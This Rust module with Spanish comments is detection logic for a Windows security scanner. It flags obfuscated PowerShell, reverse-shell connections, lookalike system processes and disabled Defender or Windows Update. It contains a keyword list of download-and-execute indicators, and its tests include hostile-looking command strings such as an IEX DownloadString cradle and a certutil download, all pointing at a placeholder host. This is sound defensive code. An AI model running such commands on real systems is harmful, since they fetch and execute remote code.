//! Reglas de detección: comandos ofuscados, reverse shells, procesos de sistema falsos y
//! manipulación de Defender / Windows Update. Las reglas son funciones puras sobre datos ya
//! recolectados, así se pueden probar sin tocar el sistema.
use super::{signature::Sig, Finding, Severity};
use crate::ps;
use base64::{engine::general_purpose::STANDARD_NO_PAD, Engine};
use std::{collections::HashMap, env, path::{Path, PathBuf}};

// ---------------------------------------------------------------- comandos ofuscados

const PATTERNS: &[&str] = &[
    "-enc",
    "-encodedcommand",
    "-w hidden",
    "-windowstyle hidden",
    "-nop",
    "-executionpolicy bypass",
    "-ep bypass",
    "iex",
    "invoke-expression",
    "downloadstring",
    "downloadfile",
    "net.webclient",
    "invoke-webrequest",
    "frombase64string",
    "mshta http",
    "regsvr32 /i:http",
    "certutil -urlcache",
];

fn is_word(c: Option<char>) -> bool {
    c.is_some_and(|c| c.is_alphanumeric() || c == '_')
}

/// `pat` aparece como palabra completa: `-nop` no coincide con `-NoProfile` ni `iex` con `index`.
fn has_pattern(lower: &str, pat: &str) -> bool {
    lower.match_indices(pat).any(|(i, _)| !is_word(lower[..i].chars().next_back()) && !is_word(lower[i + pat.len()..].chars().next()))
}

pub struct Obfuscated {
    pub patterns: Vec<&'static str>,
    /// Comando real, si estaba en base64 (UTF-16LE).
    pub decoded: Option<String>,
}

/// Decodifica el argumento de `-enc` / `-EncodedCommand`.
pub fn decode_encoded(cmd: &str) -> Option<String> {
    let lower = cmd.to_lowercase();
    let at = ["-encodedcommand", "-enc"].iter().find_map(|p| lower.match_indices(p).find(|(i, _)| !is_word(lower[..*i].chars().next_back()) && !is_word(lower[i + p.len()..].chars().next())).map(|(i, _)| i + p.len()))?;
    let b64: String = cmd[at..].split_whitespace().next()?.trim_matches(|c| c == '"' || c == '\'').trim_end_matches('=').to_string();
    let bytes = STANDARD_NO_PAD.decode(b64).ok()?;
    let units: Vec<u16> = bytes.as_chunks::<2>().0.iter().map(|c| u16::from_le_bytes(*c)).collect();
    let text = String::from_utf16(&units).ok()?;
    let printable = text.chars().filter(|c| !c.is_control() || c.is_whitespace()).count();
    (!text.is_empty() && printable * 10 >= text.chars().count() * 9).then_some(text)
}

pub fn obfuscation(command: &str) -> Option<Obfuscated> {
    let lower = command.to_lowercase();
    let patterns: Vec<&'static str> = PATTERNS.iter().copied().filter(|p| has_pattern(&lower, p)).collect();
    (!patterns.is_empty()).then(|| Obfuscated { decoded: decode_encoded(command), patterns })
}

/// Qué significa cada señal, en lenguaje simple.
pub fn explain(pattern: &str) -> &'static str {
    match pattern {
        "-enc" | "-encodedcommand" => "el comando está codificado para que no se lea",
        "-w hidden" | "-windowstyle hidden" => "se ejecuta con la ventana oculta",
        "-nop" => "se ejecuta sin cargar la configuración normal",
        "-executionpolicy bypass" | "-ep bypass" => "se salta las restricciones de seguridad de PowerShell",
        "iex" | "invoke-expression" => "ejecuta texto como si fuera código",
        "frombase64string" => "esconde datos codificados",
        "mshta http" | "regsvr32 /i:http" | "certutil -urlcache" => "baja y ejecuta algo desde internet",
        _ => "descarga algo desde internet", // downloadstring, downloadfile, net.webclient, invoke-webrequest
    }
}

pub fn obfuscation_finding(key: String, what: &str, command: &str, o: &Obfuscated) -> Finding {
    Finding {
        key,
        severity: Severity::Medium,
        title: format!("Comando sospechoso en {what}"),
        detail: format!("Qué tiene de raro: {}.\n{}", dedup_explanations(&o.patterns), shorten(command, 300)),
        decoded: o.decoded.clone(),
        fix: None,
    }
}

fn dedup_explanations(patterns: &[&str]) -> String {
    let mut out: Vec<&str> = vec![];
    for p in patterns {
        let e = explain(p);
        if !out.contains(&e) {
            out.push(e);
        }
    }
    out.join("; ")
}

pub fn shorten(s: &str, n: usize) -> String {
    if s.chars().count() <= n { s.to_string() } else { format!("{}…", s.chars().take(n).collect::<String>()) }
}

// ---------------------------------------------------------------- procesos y conexiones

#[derive(Debug, Clone)]
pub struct Proc {
    pub pid: u32,
    pub ppid: u32,
    pub name: String,
    pub path: Option<PathBuf>,
    pub cmd: String,
}

#[derive(Debug, Clone)]
pub struct Conn {
    pub pid: u32,
    pub remote: String,
    pub port: u16,
}

pub fn processes() -> Vec<Proc> {
    let script = "Get-CimInstance Win32_Process | ForEach-Object { [pscustomobject]@{ pid=[int]$_.ProcessId; ppid=[int]$_.ParentProcessId; \
        name=[string]$_.Name; path=[string]$_.ExecutablePath; cmd=[string]$_.CommandLine } } | ConvertTo-Json -Compress";
    ps::rows(&ps::run(script).unwrap_or_default())
        .iter()
        .map(|r| Proc {
            pid: r.get("pid").and_then(|v| v.as_u64()).unwrap_or(0) as u32,
            ppid: r.get("ppid").and_then(|v| v.as_u64()).unwrap_or(0) as u32,
            name: ps::text(r, "name"),
            path: Some(ps::text(r, "path")).filter(|p| !p.is_empty()).map(PathBuf::from),
            cmd: ps::text(r, "cmd"),
        })
        .collect()
}

pub fn connections() -> Vec<Conn> {
    let script = "Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | ForEach-Object { [pscustomobject]@{ pid=[int]$_.OwningProcess; \
        remote=[string]$_.RemoteAddress; port=[int]$_.RemotePort } } | ConvertTo-Json -Compress";
    ps::rows(&ps::run(script).unwrap_or_default())
        .iter()
        .map(|r| Conn { pid: r.get("pid").and_then(|v| v.as_u64()).unwrap_or(0) as u32, remote: ps::text(r, "remote"), port: r.get("port").and_then(|v| v.as_u64()).unwrap_or(0) as u16 })
        .collect()
}

/// Conexión hacia otra máquina (no local).
fn is_outbound(remote: &str) -> bool {
    !(remote.is_empty() || remote == "::1" || remote == "::" || remote == "0.0.0.0" || remote.starts_with("127.") || remote.starts_with("::ffff:127."))
}

fn stem(name: &str) -> String {
    name.to_lowercase().trim_end_matches(".exe").to_string()
}

const SHELLS: &[&str] = &["powershell", "pwsh", "cmd", "wscript", "cscript", "mshta", "rundll32", "regsvr32", "certutil"];

fn in_user_area(p: &Path) -> bool {
    let s = p.to_string_lossy().to_lowercase();
    ["\\appdata\\", "\\temp\\", "\\programdata\\"].iter().any(|d| s.contains(d))
}

/// Rutas de procesos con conexión saliente en zonas de usuario: hay que verificar su firma.
pub fn paths_to_verify(procs: &[Proc], conns: &[Conn]) -> Vec<PathBuf> {
    let pids: Vec<u32> = conns.iter().filter(|c| is_outbound(&c.remote)).map(|c| c.pid).collect();
    procs.iter().filter(|p| pids.contains(&p.pid)).filter_map(|p| p.path.clone()).filter(|p| in_user_area(p)).collect()
}

/// Reverse shells: un intérprete de comandos con conexión saliente (alta), o un programa sin firmar
/// que vive en AppData/Temp/ProgramData y habla con el exterior (media).
pub fn reverse_shells(procs: &[Proc], conns: &[Conn], sigs: &HashMap<PathBuf, Sig>, own_pid: u32) -> Vec<Finding> {
    let mut out: Vec<Finding> = vec![];
    for c in conns.iter().filter(|c| is_outbound(&c.remote)) {
        let Some(p) = procs.iter().find(|p| p.pid == c.pid) else { continue };
        if p.pid == own_pid || p.ppid == own_pid {
            continue;
        }
        let s = stem(&p.name);
        let (severity, why) = if SHELLS.contains(&s.as_str()) {
            (Severity::High, format!("{} tiene una conexión saliente. Los intérpretes de comandos casi nunca la necesitan: es lo que usan los atacantes para controlar una PC a distancia.", p.name))
        } else if p.path.as_ref().is_some_and(|x| in_user_area(x)) && !p.path.as_ref().and_then(|x| sigs.get(x)).is_some_and(Sig::is_valid) {
            (Severity::Medium, format!("{} no está firmado, vive en una carpeta de usuario y se conecta al exterior.", p.name))
        } else {
            continue;
        };
        let key = format!("revshell:{s}:{}:{}", c.remote, c.port);
        if out.iter().any(|f| f.key == key) {
            continue;
        }
        let path = p.path.as_ref().map(|x| x.display().to_string()).unwrap_or_else(|| "ruta no disponible".into());
        out.push(Finding { key, severity, title: format!("Conexión saliente de {} hacia {}:{}", p.name, c.remote, c.port), detail: format!("{why}\nRuta: {path}\nPID {}", p.pid), decoded: None, fix: None });
    }
    out
}

// ---------------------------------------------------------------- procesos de sistema falsos

const SYSTEM_NAMES: &[&str] = &["svchost", "explorer", "lsass", "csrss", "winlogon", "dwm", "services"];

/// Distancia de edición con transposiciones (svch0st = 1, scvhost = 1).
pub fn distance(a: &str, b: &str) -> usize {
    let (a, b): (Vec<char>, Vec<char>) = (a.chars().collect(), b.chars().collect());
    let mut d = vec![vec![0usize; b.len() + 1]; a.len() + 1];
    for (i, row) in d.iter_mut().enumerate() {
        row[0] = i;
    }
    for (j, cell) in d[0].iter_mut().enumerate() {
        *cell = j;
    }
    for i in 1..=a.len() {
        for j in 1..=b.len() {
            let cost = usize::from(a[i - 1] != b[j - 1]);
            d[i][j] = (d[i - 1][j] + 1).min(d[i][j - 1] + 1).min(d[i - 1][j - 1] + cost);
            if i > 1 && j > 1 && a[i - 1] == b[j - 2] && a[i - 2] == b[j - 1] {
                d[i][j] = d[i][j].min(d[i - 2][j - 2] + 1);
            }
        }
    }
    d[a.len()][b.len()]
}

fn legit_dir(name: &str, path: &Path, windir: &str) -> bool {
    let p = path.parent().map(|d| d.to_string_lossy().to_lowercase()).unwrap_or_default();
    let w = windir.to_lowercase();
    p == format!(r"{w}\system32") || p == format!(r"{w}\syswow64") || (name == "explorer" && p == w) // explorer.exe vive en C:\Windows
}

fn in_install_dir(path: &Path, windir: &str) -> bool {
    let l = path.to_string_lossy().to_lowercase();
    let pf = |v: &str| env::var(v).map(|d| d.to_lowercase()).ok();
    [Some(windir.to_lowercase()), pf("ProgramFiles"), pf("ProgramFiles(x86)")].into_iter().flatten().any(|d| l.starts_with(&format!("{d}\\")))
}

/// Procesos que se hacen pasar por los de Windows: el mismo nombre fuera de System32, o uno casi igual
/// (con errores de tipeo) que no tenga una firma válida.
pub fn fake_system_processes(procs: &[Proc], sigs: &HashMap<PathBuf, Sig>, windir: &str) -> Vec<Finding> {
    let mut out: Vec<Finding> = vec![];
    for p in procs {
        let s = stem(&p.name);
        let (title, why) = if SYSTEM_NAMES.contains(&s.as_str()) {
            match &p.path {
                Some(path) if !legit_dir(&s, path, windir) => (format!("{} corre fuera de System32", p.name), format!("El {} de Windows vive en System32. Este está en: {}", s, path.display())),
                _ => continue,
            }
        } else if s.len() >= 5 && SYSTEM_NAMES.iter().any(|n| n.len() >= 5 && distance(&s, n) == 1) {
            // Sin ruta (proceso protegido) no se puede verificar: no se acusa. Tampoco a lo firmado ni a lo
            // instalado en Program Files o Windows: un fabricante puede llamar service.exe a lo suyo.
            let Some(path) = &p.path else { continue };
            if sigs.get(path).is_some_and(Sig::is_valid) || in_install_dir(path, windir) {
                continue;
            }
            (format!("{} imita el nombre de un proceso de Windows", p.name), "El nombre es casi igual al de un proceso del sistema y no tiene una firma válida.".to_string())
        } else {
            continue;
        };
        let path = p.path.as_ref().map(|x| x.display().to_string()).unwrap_or_else(|| "ruta no disponible".into());
        let key = format!("fakeproc:{s}:{}", path.to_lowercase());
        if !out.iter().any(|f| f.key == key) {
            out.push(Finding { key, severity: Severity::High, title, detail: format!("{why}\nPID {}", p.pid), decoded: None, fix: None });
        }
    }
    out
}

/// Procesos con nombre parecido a los del sistema cuya firma hay que verificar.
pub fn lookalike_paths(procs: &[Proc]) -> Vec<PathBuf> {
    procs.iter().filter(|p| { let s = stem(&p.name); s.len() >= 5 && !SYSTEM_NAMES.contains(&s.as_str()) && SYSTEM_NAMES.iter().any(|n| n.len() >= 5 && distance(&s, n) == 1) }).filter_map(|p| p.path.clone()).collect()
}

// ---------------------------------------------------------------- Defender y Windows Update

/// Exclusiones de Defender (rutas, procesos y extensiones). None si Windows no las muestra sin administrador.
pub fn defender_exclusions() -> Option<Vec<String>> {
    let script = "$p = Get-MpPreference; [pscustomobject]@{ path=@($p.ExclusionPath); proc=@($p.ExclusionProcess); ext=@($p.ExclusionExtension) } | ConvertTo-Json -Compress";
    let json = ps::run(script).ok()?;
    let rows = ps::rows(&json);
    let r = rows.first()?;
    let mut all = vec![];
    for (field, label) in [("path", "ruta"), ("proc", "proceso"), ("ext", "extensión")] {
        for v in ps::strings(r, field) {
            if v.starts_with("N/A") {
                return None; // "Must be an administrator to view exclusions"
            }
            all.push(format!("{label}: {v}"));
        }
    }
    Some(all)
}

pub fn exclusion_finding(item: &str) -> Finding {
    Finding {
        key: format!("defender:exclusion:{}", item.to_lowercase()),
        severity: Severity::High,
        title: "Defender tiene una exclusión nueva".into(),
        detail: format!("{item}\nDefender no analiza lo que está excluido: el malware suele agregarse acá para esconderse."),
        decoded: None,
        fix: None,
    }
}

pub fn defender_state_findings(realtime: bool, enabled: bool, passive: bool) -> Vec<Finding> {
    if passive || (realtime && enabled) {
        return vec![];
    }
    vec![Finding {
        key: "defender:realtime-off".into(),
        severity: Severity::High,
        title: "La protección en tiempo real de Defender está apagada".into(),
        detail: "Sin esta protección, Windows no revisa los archivos al abrirlos. Si no la apagaste vos, conviene investigarlo.".into(),
        decoded: None,
        fix: None,
    }]
}

/// Windows Update y la herramienta de eliminación de software malintencionado (MRT) deshabilitados.
pub fn update_findings() -> Vec<Finding> {
    let mut out = vec![];
    let start: Option<u32> = winreg::RegKey::predef(winreg::enums::HKEY_LOCAL_MACHINE)
        .open_subkey(r"SYSTEM\CurrentControlSet\Services\wuauserv")
        .and_then(|k| k.get_value("Start"))
        .ok();
    if start == Some(4) {
        out.push(Finding { key: "wu:service".into(), severity: Severity::High, title: "El servicio de Windows Update está deshabilitado".into(), detail: "Sin él, la PC no recibe parches de seguridad.".into(), decoded: None, fix: None });
    }
    let script = "Get-ScheduledTask -TaskPath '\\Microsoft\\Windows\\WindowsUpdate\\','\\Microsoft\\Windows\\RemovalTools\\' -ErrorAction SilentlyContinue | \
        Where-Object { $_.State -eq 'Disabled' } | ForEach-Object { [pscustomobject]@{ path=[string]$_.TaskPath; name=[string]$_.TaskName } } | ConvertTo-Json -Compress";
    for r in ps::rows(&ps::run(script).unwrap_or_default()) {
        let (path, name) = (ps::text(&r, "path"), ps::text(&r, "name"));
        out.push(Finding {
            key: format!("wu:task:{}{}", path.to_lowercase(), name.to_lowercase()),
            severity: Severity::High,
            title: format!("Tarea de Windows deshabilitada: {name}"),
            detail: format!("{path}{name}\nEs una tarea de Windows Update o del eliminador de software malintencionado."),
            decoded: None,
            fix: None,
        });
    }
    out
}

pub fn windir() -> String {
    env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".into())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn p(pid: u32, name: &str, path: &str) -> Proc {
        Proc { pid, ppid: 1, name: name.into(), path: Some(PathBuf::from(path)), cmd: String::new() }
    }
    fn c(pid: u32, remote: &str) -> Conn {
        Conn { pid, remote: remote.into(), port: 4444 }
    }

    #[test]
    fn detects_patterns_as_whole_words() {
        assert!(obfuscation("powershell -nop -w hidden -c x").is_some());
        assert!(obfuscation("powershell -NoProfile -NonInteractive -Command Get-Date").is_none()); // lo común no alarma
        assert!(obfuscation("cmd /c index.html").is_none()); // "iex" dentro de "index"
        assert!(obfuscation("IEX (New-Object Net.WebClient).DownloadString('http://x')").is_some());
        assert!(obfuscation("certutil -urlcache -f http://x/a.exe a.exe").is_some());
        assert!(obfuscation("notepad.exe").is_none());
    }

    #[test]
    fn explains_each_signal_in_plain_words() {
        let o = obfuscation("powershell -nop -w hidden -enc AAAA").unwrap();
        let f = obfuscation_finding("k".into(), "x", "powershell -nop -w hidden -enc AAAA", &o);
        assert!(f.detail.contains("codificado") && f.detail.contains("ventana oculta"), "{}", f.detail);
        assert!(!f.detail.contains("Coincide con"));
    }

    #[test]
    fn decodes_powershell_encoded_commands() {
        // "Write-Host hola" en UTF-16LE y base64
        let enc = "VwByAGkAdABlAC0ASABvAHMAdAAgAGgAbwBsAGEA";
        let o = obfuscation(&format!("powershell.exe -NoP -Enc {enc}")).unwrap();
        assert_eq!(o.decoded.as_deref(), Some("Write-Host hola"));
        assert!(o.patterns.contains(&"-enc"));
        assert!(decode_encoded("powershell -enc ###").is_none());
    }

    #[test]
    fn reverse_shell_rules() {
        let procs = vec![p(10, "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"), p(11, "chrome.exe", r"C:\Program Files\Google\Chrome\chrome.exe"), p(12, "raro.exe", r"C:\Users\a\AppData\Local\Temp\raro.exe"), p(13, "cmd.exe", r"C:\Windows\System32\cmd.exe")];
        let conns = vec![c(10, "203.0.113.5"), c(11, "142.250.1.1"), c(12, "198.51.100.7"), c(13, "127.0.0.1")];
        let f = reverse_shells(&procs, &conns, &HashMap::new(), 999);
        assert_eq!(f.len(), 2, "{f:?}");
        assert!(f.iter().any(|x| x.severity == Severity::High && x.title.contains("powershell")));
        assert!(f.iter().any(|x| x.severity == Severity::Medium && x.title.contains("raro")));
        // el mismo programa pero firmado ya no alerta
        let mut sigs = HashMap::new();
        sigs.insert(PathBuf::from(r"C:\Users\a\AppData\Local\Temp\raro.exe"), Sig::Valid("Editor".into()));
        assert_eq!(reverse_shells(&procs, &conns, &sigs, 999).len(), 1);
        // lo que lanzó lumen mismo se ignora
        assert!(reverse_shells(&procs, &[c(10, "203.0.113.5")], &HashMap::new(), 1).is_empty());
    }

    #[test]
    fn distance_handles_typos_and_swaps() {
        assert_eq!(distance("svch0st", "svchost"), 1);
        assert_eq!(distance("scvhost", "svchost"), 1);
        assert_eq!(distance("svchost", "svchost"), 0);
        assert!(distance("chrome", "svchost") > 2);
    }

    #[test]
    fn fake_system_process_rules() {
        let w = r"C:\WINDOWS";
        let procs = vec![
            p(1, "svchost.exe", r"C:\Windows\System32\svchost.exe"),
            p(2, "explorer.exe", r"C:\Windows\explorer.exe"), // explorer vive en C:\Windows
            p(3, "svchost.exe", r"C:\Users\a\AppData\Roaming\svchost.exe"),
            p(4, "svch0st.exe", r"C:\Users\a\AppData\Local\Temp\svch0st.exe"),
            p(5, "service.exe", r"D:\Fabricante\service.exe"),
            p(6, "lsass.exe", r"C:\Windows\System32\lsass.exe"),
            Proc { pid: 7, ppid: 1, name: "service.exe".into(), path: None, cmd: String::new() }, // protegido: sin ruta
        ];
        let mut sigs = HashMap::new();
        sigs.insert(PathBuf::from(r"D:\Fabricante\service.exe"), Sig::Valid("Fabricante".into()));
        let f = fake_system_processes(&procs, &sigs, w);
        assert_eq!(f.len(), 2, "{:?}", f.iter().map(|x| &x.title).collect::<Vec<_>>());
        assert!(f.iter().all(|x| x.severity == Severity::High));
        // sin firma, el service.exe de D:\ sí es sospechoso; el que no tiene ruta sigue sin acusarse
        assert_eq!(fake_system_processes(&procs, &HashMap::new(), w).len(), 3);
    }

    #[test]
    fn defender_state_rules() {
        assert!(defender_state_findings(true, true, false).is_empty());
        assert!(defender_state_findings(false, true, true).is_empty()); // otro antivirus es el principal
        assert_eq!(defender_state_findings(false, true, false)[0].severity, Severity::High);
        assert!(exclusion_finding("ruta: C:\\x").key.starts_with("defender:exclusion:"));
    }
}
